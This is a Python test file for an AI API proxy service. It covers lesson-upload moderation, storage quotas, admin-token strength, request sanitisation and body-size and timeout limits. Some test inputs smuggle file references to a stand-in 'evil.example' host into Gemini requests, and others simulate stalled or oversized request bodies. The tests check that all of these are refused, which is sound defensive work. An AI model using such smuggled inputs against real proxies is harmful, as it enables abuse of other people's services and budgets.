    full = client.get(p["full"], headers=ADMIN)
    assert full.status_code == 200 and full.headers["cache-control"] == "no-store"
    (c,) = full.json()["candidates"]
    assert c["lesson"] == lesson and c["status"] == "pending" and c["schema"] == 1
    assert c["hash"].startswith(digest) and len(c["hash"]) == 64 and "body" not in c
    assert c["commands"] == [] and c["uploader"] == app_mod.hash_token(h["Authorization"][7:])[:12]
    assert client.get(f"/admin/lessons/{VID}/candidates/{digest}?schema=2", headers=ADMIN).status_code == 404
    assert client.get(f"/admin/lessons/{VID}/candidates/00000000", headers=ADMIN).status_code == 404
    assert client.get(f"/admin/lessons/{VID}/candidates/XYZ", headers=ADMIN).status_code == 400
    assert client.get(f"/admin/lessons/{VID}/candidates/{digest}").status_code == 401


def test_old_pending_candidates_are_pruned(make_cloud):
    client, app_mod = lesson_client(make_cloud)
    assert app_mod.LESSON_PENDING_MAX_DAYS == 14
    old, new = claimed(client), claimed(client)
    assert put(client, old, {"steps": [{"title": "old"}]}).status_code == 201
    app_mod.store._q("UPDATE lesson_candidates SET created_at = created_at - 15 * 86400")
    assert put(client, new, {"steps": [{"title": "new"}]}).status_code == 201
    assert [p["uploader"] for p in client.get("/admin/lessons/pending", headers=ADMIN).json()["pending"]] == [
        app_mod.hash_token(new["Authorization"][7:])[:12]]


def test_pending_bytes_are_bounded_per_network_and_in_total(make_cloud, tmp_path):
    """Each fresh token can park pending uploads, and minting gives 60 tokens per IP a day: pending bytes are
    bounded per uploader network (/24) and in total, so they cannot fill the disk past the 85% gate."""
    lesson = {"steps": [{"title": "x" * 60}]}
    size = len(json.dumps(lesson, separators=(",", ":")).encode())
    client, app_mod = lesson_client(make_cloud, LESSON_PENDING_PER_NET_MB=str((size + 10) / 1048576))
    a, b, c = claimed(client), claimed(client), claimed(client)
    assert put(client, a, lesson, **{"X-Forwarded-For": "198.51.100.10"}).status_code == 201
    assert put(client, a, lesson, **{"X-Forwarded-For": "198.51.100.10"}).status_code == 201  # replacing its own
    r = put(client, b, lesson, **{"X-Forwarded-For": "198.51.100.11"})  # the same /24
    assert r.status_code == 507 and r.json()["error"]["type"] == "insufficient_storage"
    assert put(client, c, lesson, **{"X-Forwarded-For": "203.0.113.10"}).status_code == 201  # another network

    client, app_mod = lesson_client(make_cloud, LESSON_PENDING_MAX_MB=str((2 * size + 10) / 1048576),
                                    DB_PATH=str(tmp_path / "second.db"))
    a, b, c = claimed(client), claimed(client), claimed(client)
    assert put(client, a, lesson, **{"X-Forwarded-For": "198.51.100.10"}).status_code == 201
    assert put(client, b, lesson, **{"X-Forwarded-For": "203.0.113.10"}).status_code == 201
    assert put(client, c, lesson, **{"X-Forwarded-For": "192.0.2.10"}).status_code == 507
    # an approved lesson leaves the pending budget
    digest = app_mod.lesson_hash(lesson)[:16]
    assert client.post(f"/admin/lessons/{VID}/approve", headers=ADMIN, json={"hash": digest}).status_code == 200
    assert put(client, c, lesson, **{"X-Forwarded-For": "192.0.2.10"}).status_code == 201
    _, app_mod = make_cloud(unset=("LESSON_PENDING_MAX_MB", "LESSON_PENDING_PER_NET_MB", "LESSON_PENDING_MAX_DAYS"))
    assert app_mod.LESSON_PENDING_MAX_BYTES == 128 * 1024 * 1024 and app_mod.LESSON_PENDING_PER_NET_BYTES == 8 * 1024 * 1024


def test_lesson_pending_until_approved_and_purge_by_uploader(make_cloud):
    client, app_mod = lesson_client(make_cloud)
    bad = claimed(client)
    good = claimed(client)
    reader, _ = install(client)
    rb = put(client, bad, {"steps": [{"title": "spam"}]})
    rg = put(client, good, {"steps": [{"title": "real"}]})
    assert rb.json()["status"] == rg.json()["status"] == "pending"
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=reader).status_code == 404
    approve = client.post(f"/admin/lessons/{VID}/approve", headers=ADMIN, json={"hash": rb.json()["hash"]})
    assert approve.status_code == 200
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=reader).json()["lesson"] == {"steps": [{"title": "spam"}]}
    bad_prefix = app_mod.hash_token(bad["Authorization"][7:])[:12]
    r = client.delete(f"/admin/lessons/by-uploader/{bad_prefix}", headers=ADMIN)
    assert r.json() == {"uploader": bad_prefix, "deleted": 1}
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=reader).status_code == 404
    pending = client.get("/admin/lessons/pending", headers=ADMIN).json()["pending"]
    assert [p["hash"] for p in pending] == [rg.json()["hash"]]
    assert client.delete("/admin/lessons/by-uploader/xyz", headers=ADMIN).status_code == 400
    assert client.get("/admin/lessons/pending").status_code == 401


def test_lesson_uploads_per_install_per_day(make_cloud):
    client, app_mod = lesson_client(make_cloud, LESSON_PUTS_PER_DAY="2")
    vids = ["aaaaaaaaaaa", "bbbbbbbbbbb", "ccccccccccc"]
    h, _ = install(client)
    for v in vids:
        client.post(f"/v1/lessons/{v}/build", headers=h)
    assert [put(client, h, {"steps": [{"title": "x"}]}, vid=v).status_code for v in vids[:2]] == [201, 201]
    r = put(client, h, {"steps": [{"title": "x"}]}, vid=vids[2])
    assert r.status_code == 429 and r.json()["error"]["limit"] == "lesson_uploads"
    _, app_mod = make_cloud(unset=("LESSON_PUTS_PER_DAY",))
    assert app_mod.LESSON_PUTS_PER_DAY == 10


def test_lesson_uploads_stop_when_the_disk_is_full(make_cloud, monkeypatch):
    client, app_mod = lesson_client(make_cloud)
    h = claimed(client)
    usage = namedtuple("usage", "total used free")
    monkeypatch.setattr(app_mod.shutil, "disk_usage", lambda _p: usage(100, 86, 14))
    r = put(client, h, {"steps": [{"title": "x"}]})
    assert r.status_code == 507 and r.json()["error"]["type"] == "insufficient_storage"
    monkeypatch.setattr(app_mod.shutil, "disk_usage", lambda _p: usage(100, 84, 16))
    assert put(client, h, {"steps": [{"title": "x"}]}).status_code == 201


def test_auto_approve_needs_distinct_uploaders_on_distinct_networks(make_cloud):
    client, _ = lesson_client(make_cloud, LESSON_AUTO_APPROVE_N="2")
    same = {"steps": [{"title": "same", "file": "a.py"}]}
    reordered = {"steps": [{"file": "a.py", "title": "same"}]}  # identical once normalized
    a, b, c = claimed(client), claimed(client), claimed(client)
    assert put(client, a, same, **{"X-Forwarded-For": "198.51.100.10"}).json()["status"] == "pending"
    # a second uploader on the same /24 is not independent
    assert put(client, b, reordered, **{"X-Forwarded-For": "198.51.100.11"}).json()["status"] == "pending"
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=a).status_code == 404
    assert put(client, c, same, **{"X-Forwarded-For": "203.0.113.10"}).json()["status"] == "approved"
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=a).json()["lesson"] == same


def test_auto_approve_is_off_by_default(make_cloud):
    client, app_mod = lesson_client(make_cloud)
    assert app_mod.LESSON_AUTO_APPROVE_N == 0
    same = {"steps": [{"title": "same"}]}
    for i in range(3):
        h = claimed(client)
        assert put(client, h, same, **{"X-Forwarded-For": f"10.{i}.0.1"}).json()["status"] == "pending"


def test_first_writer_lessons_become_pending_on_upgrade(tmp_path, monkeypatch):
    db = tmp_path / "old.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE lessons (video_id TEXT NOT NULL, schema INTEGER NOT NULL, body TEXT NOT NULL, bytes INTEGER NOT NULL, "
                "uploader TEXT NOT NULL, created_at REAL NOT NULL, hits INTEGER NOT NULL DEFAULT 0, PRIMARY KEY (video_id, schema))")
    con.execute("INSERT INTO lessons VALUES (?, 1, ?, 20, 'u1', 0, 5)", (VID, json.dumps({"steps": [{"title": "old"}]})))
    con.commit()
    con.close()
    monkeypatch.syspath_prepend(str(CLOUD))
    sys.modules.pop("store", None)
    s = importlib.import_module("store").Store(str(db))
    assert s.get_lesson(VID, 1) is None  # nobody reviewed it: not served
    assert [p["video_id"] for p in s.pending_lessons()] == [VID]
    assert s._q("SELECT COUNT(*) AS n FROM lessons")[0]["n"] == 0
    sys.modules.pop("store", None)


# --------------------------------------------------------------------------- A22: admin token

@pytest.mark.parametrize("token", ["test", "admin-test", "short-but-random-Q8x!", "a" * 40, "changeme",
                                   "abcabcabcabcabcabcabcabcabcabcabcabc", ""])
def test_weak_admin_token_turns_admin_off_without_crashing(make_cloud, caplog, token):
    with caplog.at_level(logging.ERROR, logger="miyagi.cloud"):
        client, app_mod = make_cloud(ADMIN_TOKEN=token)
    assert app_mod.ADMIN_ENABLED is False
    assert "ADMIN_TOKEN is" in caplog.text
    if len(token) >= 8:
        assert token not in caplog.text  # the value is never logged
    assert client.get("/healthz").status_code == 200
    for r in (client.get("/admin/usage", headers={"X-Admin-Token": token}), client.get("/admin"),
              client.post("/admin", data={"admin_token": token}), client.get("/admin/lessons/pending", headers={"X-Admin-Token": token}),
              client.post("/admin/tokens/0123456789ab/disable", headers={"X-Admin-Token": token})):
        assert r.status_code == 503 and r.json()["error"]["type"] == "admin_disabled"
    h, _ = install(client)  # the proxy itself keeps working
    assert anthropic(client, h).status_code == 502


def test_unset_admin_token_does_not_crash(make_cloud):
    client, app_mod = make_cloud(unset=("ADMIN_TOKEN",))
    assert app_mod.ADMIN_ENABLED is False
    assert client.get("/admin/usage").status_code == 503


def test_strong_admin_token_works(make_cloud):
    client, app_mod = make_cloud()
    assert app_mod.ADMIN_ENABLED is True and len(ADMIN_TOKEN) >= 32
    assert client.get("/admin/usage", headers=ADMIN).status_code == 200
    assert app_mod.admin_token_problem(ADMIN_TOKEN) is None


# --------------------------------------------------------------------------- round 3: the rate-limit review's leftovers

@pytest.mark.parametrize("part", [
    # the probe: Gemini 3 multimodal function responses carry file_data / inline_data the model reads
    {"functionResponse": {"name": "f", "response": {}, "parts": [{"fileData": {"fileUri": "https://evil.example/huge.pdf"}}]}},
    {"functionResponse": {"name": "f", "response": {}, "parts": [{"file_data": {"file_uri": "gs://bucket/x.mp4"}}]}},
    {"functionResponse": {"name": "f", "response": {}, "parts": [{"inline_data": {"mime_type": "image/png", "data": "AA=="}}]}},
    {"functionResponse": {"name": "f", "response": {"file_data": {"file_uri": "gs://bucket/x.mp4"}}}},
    {"functionCall": {"name": "f", "args": {"fileData": {"fileUri": "https://evil.example/x"}}}},
    {"inlineData": {"mimeType": "image/png", "data": "AA==", "fileUri": "https://evil.example/x"}},
])
def test_gemini_file_refs_nested_in_a_part_are_refused(make_cloud, part):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    r = post_gemini(client, h, gem_body(contents=[{"role": "user", "parts": [part]}]))
    assert r.status_code == 400, r.text
    assert up.requests == [] and app_mod.inflight.total == 0 and app_mod.inflight.per == {}


def test_gemini_function_response_is_rebuilt(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    fr = {"id": "call-1", "name": "lookup", "response": {"result": 42}, "willContinue": True, "scheduling": "SILENT"}
    contents = [{"role": "model", "parts": [{"functionCall": {"name": "lookup", "args": {"q": "x"}}}]},
                {"role": "user", "parts": [{"functionResponse": fr}, {"file_data": {"file_uri": "gs://b/x"}}]}]
    assert post_gemini(client, h, gem_body(contents=contents)).status_code == 200
    sent = up.last["contents"]
    assert sent[1]["parts"] == [{"functionResponse": {"name": "lookup", "response": {"result": 42}, "id": "call-1"}}]
    assert "file_data" not in json.dumps(up.last) and "gs://" not in json.dumps(up.last)  # snake_case part: dropped


def test_gemini_video_fps_is_clamped_and_reserved_at_its_rate(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    assert app_mod.GEMINI_MAX_FPS == 2.0 and app_mod.GEMINI_CONTEXT_TOKENS == 1_048_576
    part = {"fileData": {"fileUri": YT}, "videoMetadata": {"startOffset": "0s", "endOffset": "60s", "fps": 24,
                                                           "fileUri": "https://evil.example/x"}}  # unknown keys dropped
    assert post_gemini(client, h, gem_body(contents=[{"parts": [part]}])).status_code == 200
    assert up.last["contents"][0]["parts"][0]["videoMetadata"] == {"startOffset": "0s", "endOffset": "60s", "fps": 2.0}
    # a 60 s window at 24 fps is reserved at 2 fps (what is forwarded)
    clean, _ = app_mod.sanitize_gemini({"contents": [{"parts": [part]}]})
    assert app_mod._video_tokens(clean["contents"][0]["parts"][0], False) == int(60 * (2 * 258 + 32))
    # a whole video above 0.5 fps holds more than the flat reserve; at 0.5 fps (or low resolution) the flat reserve
    def whole(fps):
        return {"fileData": {"fileUri": YT}, "videoMetadata": {"fps": fps}}
    assert app_mod._video_tokens(whole(2), False) == int(300_000 * (2 * 258 + 32) / (0.5 * 258 + 32))
    assert app_mod._video_tokens(whole(24), False) == app_mod._video_tokens(whole(2), False)  # a raw 24 is clamped too
    assert app_mod._video_tokens(whole(0.5), False) == 300_000
    assert app_mod._video_tokens(whole(0.5), True) == 300_000
    assert app_mod._video_tokens({"fileData": {"fileUri": YT}}, False) == int(300_000 * 290 / 161)  # Gemini's 1 fps
    # a huge window is capped at the model's context, and so is the call's whole input
    huge = {"fileData": {"fileUri": YT}, "videoMetadata": {"startOffset": "0s", "endOffset": "999999s", "fps": 2}}
    assert app_mod._video_tokens(huge, False) == 1_048_576
    clean, _ = app_mod.sanitize_gemini({"contents": [{"parts": [huge, huge, huge]}]})
    payload = len(json.dumps(clean).encode())
    want = 1_048_576 * app_mod.input_price(GEM) + 32768 * app_mod.output_price(GEM)
    assert app_mod.gemini_reserve(clean, GEM, payload) == pytest.approx(want)


@pytest.mark.parametrize("vm", [{"startOffset": "100s", "endOffset": "50s"}, {"startOffset": 100, "endOffset": 50},
                                {"fps": 0}, {"fps": -1}, {"fps": "24"}])
def test_gemini_inverted_window_or_bad_fps_is_refused(make_cloud, vm):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    r = post_gemini(client, h, gem_body(contents=[{"parts": [{"fileData": {"fileUri": YT}, "videoMetadata": vm}]}]))
    assert r.status_code == 400 and "videoMetadata" in r.json()["error"]["message"], r.text
    assert up.requests == []


@pytest.mark.parametrize("vm", [{"startOffset": "50s", "endOffset": "50s"}, {"startOffset": "abc", "endOffset": "50s"},
                                {"endOffset": "1e9s"}, {"startOffset": "10s"}])
def test_gemini_empty_or_unparseable_window_is_reserved_as_a_whole_video(make_cloud, vm):
    _, app_mod = make_cloud()
    clean, _ = app_mod.sanitize_gemini({"contents": [{"parts": [{"fileData": {"fileUri": YT}, "videoMetadata": {**vm, "fps": 0.5}}]}]})
    assert app_mod._video_tokens(clean["contents"][0]["parts"][0], False) == 300_000


def test_anthropic_cache_ttl_is_stripped_everywhere(make_cloud):
    client, app_mod = make_cloud()
    up = Upstream(app_mod)
    h, _ = install(client)
    one_h = {"type": "ephemeral", "ttl": "1h"}
    body = {"model": HAIKU, "max_tokens": 10,
            "system": [{"type": "text", "text": "sys", "cache_control": one_h}],
            "messages": [{"role": "user", "content": [
                {"type": "text", "text": "hi", "cache_control": one_h},
                {"type": "tool_result", "tool_use_id": "t", "content": [{"type": "text", "text": "r", "cache_control": one_h}]},
                {"type": "text", "text": "five", "cache_control": {"type": "ephemeral", "ttl": "5m"}}]}],
            "tools": [{"name": "t", "input_schema": {"type": "object"}, "cache_control": one_h}]}
    assert post_anthropic(client, h, body).status_code == 200
    sent = up.last
    assert sent["system"][0]["cache_control"] == {"type": "ephemeral"}
    content = sent["messages"][0]["content"]
    assert content[0]["cache_control"] == {"type": "ephemeral"}
    assert content[1]["content"][0]["cache_control"] == {"type": "ephemeral"}
    assert content[2]["cache_control"] == {"type": "ephemeral", "ttl": "5m"}
    assert sent["tools"][0]["cache_control"] == {"type": "ephemeral"}
    assert '"1h"' not in up.requests[-1].content.decode()
    bad = {**body, "messages": [{"role": "user", "content": [{"type": "text", "text": "x", "cache_control": {"type": "persistent"}}]}]}
    assert post_anthropic(client, h, bad).status_code == 400


def test_one_hour_cache_writes_are_priced_at_twice_input(make_cloud):
    client, app_mod = make_cloud()
    pin = app_mod.PRICES[SONNET][0] / 1e6
    assert app_mod.estimate_usd(SONNET, 1000, 0, cache_write=1000) == pytest.approx(1000 * pin * 1.25)
    assert app_mod.estimate_usd(SONNET, 1000, 0, cache_write=1000, cache_write_1h=600) == pytest.approx(400 * pin * 1.25 + 600 * pin * 2)
    usage = {"type": "message", "model": HAIKU, "content": [], "usage": {
        "input_tokens": 0, "output_tokens": 0, "cache_creation_input_tokens": 1000,
        "cache_creation": {"ephemeral_5m_input_tokens": 0, "ephemeral_1h_input_tokens": 1000}}}
    Upstream(app_mod, body=usage)
    h, _ = install(client)
    assert post_anthropic(client, h, {"model": HAIKU, "max_tokens": 10, "messages": msg()}).status_code == 200
    th = app_mod.hash_token(h["Authorization"][7:])
    assert app_mod.store.usd_today_for(th) == pytest.approx(1000 * app_mod.PRICES[HAIKU][0] / 1e6 * 2)


async def _asgi_raw(app, path: str, chunks: list[bytes], headers: dict | None = None):
    """One raw ASGI POST sending `chunks` (no Content-Length unless given). Returns the status."""
    sent: list[dict] = []
    left = list(chunks)

    async def receive():
        if left:
            c = left.pop(0)
            return {"type": "http.request", "body": c, "more_body": bool(left)}
        return {"type": "http.disconnect"}

    async def send(m):
        sent.append(m)

    hs = [(k.lower().encode(), v.encode()) for k, v in {"content-type": "application/json", **(headers or {})}.items()]
    scope = {"type": "http", "asgi": {"version": "3.0"}, "http_version": "1.1", "method": "POST", "scheme": "http",
             "path": path, "raw_path": path.encode(), "query_string": b"", "root_path": "", "headers": hs,
             "client": ("127.0.0.1", 40002), "server": ("testserver", 80)}
    await app(scope, receive, send)
    return next((m["status"] for m in sent if m["type"] == "http.response.start"), None)


def test_install_and_admin_bodies_are_small_and_time_bound(make_cloud):
    """The probe: a client declared Content-Length 2000000 on /v1/install, sent 1.9 MB and stalled; it was still
    held after 30 s. Now 4 KB is the most these routes take (declared or counted), and a stalled body is 408."""
    client, app_mod = make_cloud(BODY_READ_TIMEOUT_S="0.2")
    h, token_id = install(client)
    assert app_mod.SMALL_BODY_MAX == 4096
    pad = {"app": "test", "pad": "x" * 5000}
    for path, kw in (("/v1/install", {}), ("/v1/register", {}), (f"/admin/tokens/{token_id}/plan", {"headers": ADMIN}),
                     ("/admin/lessons/dQw4w9WgXcQ/approve", {"headers": ADMIN})):
        r = client.post(path, json=pad, **kw)
        assert r.status_code == 413 and r.json()["error"]["message"] == "Request body over 4 KB.", (path, r.text)

    async def scenario():
        # declared too big: refused before a byte is read
        assert await _asgi_raw(app_mod.app, "/v1/install", [b"{}"], {"content-length": "2000000"}) == 413
        # a body that lies about its length (or sends none) is stopped by the running count
        assert await _asgi_raw(app_mod.app, "/v1/install", [b'{"app": "', b"x" * 3000, b"x" * 3000, b'"}']) == 413
        assert await _asgi_raw(app_mod.app, "/v1/install", [b'{"app": "', b"x" * 5000, b'"}'], {"content-length": "100"}) == 413
        # a stalled small body is cut off at BODY_READ_TIMEOUT_S
        loop = asyncio.get_running_loop()
        for path, hdrs in (("/v1/install", {}), ("/v1/register", {}), (f"/admin/tokens/{token_id}/plan", ADMIN)):
            t0 = loop.time()
            status = await asyncio.wait_for(_asgi_slow(app_mod.app, path, hdrs, asyncio.Event(), asyncio.Event(), length=1000), 5)
            assert status == 408 and loop.time() - t0 < 2, path

    asyncio.run(scenario())
    # what the app and the admin send still works; a malformed body is 422 as before
    assert client.post("/v1/install", json={"app": "a", "os": "darwin", "arch": "arm64", "extra": 1}).status_code == 200
    assert client.post("/v1/install", json={"app": "a" * 65}).status_code == 422
    assert client.post("/v1/install", content=b"[1]").status_code == 422
    r = client.post("/v1/register", json={"install_id": "i", "app_version": "1", "platform": "darwin"})
    assert r.status_code == 200 and r.json()["token"].startswith("mi_")
    assert client.post("/v1/register", json={"install_id": "i"}).status_code == 422
    assert client.post(f"/admin/tokens/{token_id}/plan", json={"plan": "pro"}, headers=ADMIN).json()["plan"] == "pro"
    assert client.post(f"/admin/tokens/{token_id}/plan", json={"plan": "pro"}).status_code == 401  # auth before body
    assert app_mod.body_limit("/v1/gemini/x") == app_mod.MAX_GEMINI_BODY and app_mod.body_limit("/v1/link") == 16 * 1024
    assert app_mod.body_limit("/v1/events") == 32 * 1024 and app_mod.body_limit("/v1/anthropic/messages") == app_mod.MAX_BODY


def test_relinking_does_not_move_spend_between_caps(make_cloud):
    """A user moving spent installs onto a spare account used to reset LINKED_DAILY_USD: the spend now stays counted
    against the user it leaves (and the new user sees it too)."""
    client, app_mod = make_cloud(LINKED_DAILY_USD="0.50", FREE_DAILY_USD="5")
    spent, _ = install(client)
    other, _ = install(client)
    hs, ho = (app_mod.hash_token(x["Authorization"][7:]) for x in (spent, other))
    app_mod.store.link_user(hs, "user-a")
    app_mod.store.link_user(ho, "user-a")
    app_mod.store.add_tokens(hs, "anthropic", HAIKU, 10, 10, 0.50)
    assert anthropic(client, other).status_code == 429  # user-a is at its cap
    assert app_mod.store.link_user_capped(hs, "user-b", 10)  # relinking still works (one user per install)
    assert app_mod.store.get_link(hs)["user_id"] == "user-b"
    r = anthropic(client, other)
    assert r.status_code == 429 and r.json()["error"]["scope"] == "account"  # user-a's cap was not reset
    assert anthropic(client, spent).status_code == 429  # and user-b's sum sees the install's day
    # relinking the same pair again records nothing more
    assert app_mod.store.link_user_capped(hs, "user-b", 10)
    assert len(app_mod.store._q("SELECT * FROM moved_usage")) == 1


def test_xff_hop_count_is_logged_once_without_addresses(make_cloud, caplog):
    client, app_mod = make_cloud()
    with caplog.at_level(logging.INFO, logger="miyagi.cloud"):
        for ip in ("8.8.4.4", "9.9.9.9"):
            client.post("/v1/install", json={}, headers={"X-Forwarded-For": f"10.0.0.1, {ip}"})
    lines = [r.getMessage() for r in caplog.records if "X-Forwarded-For entr" in r.getMessage()]
    assert lines == ["first request: 2 X-Forwarded-For entries (TRUSTED_PROXY_HOPS=1); the chosen entry is a global address"]
    assert "8.8.4.4" not in caplog.text and "10.0.0.1" not in caplog.text
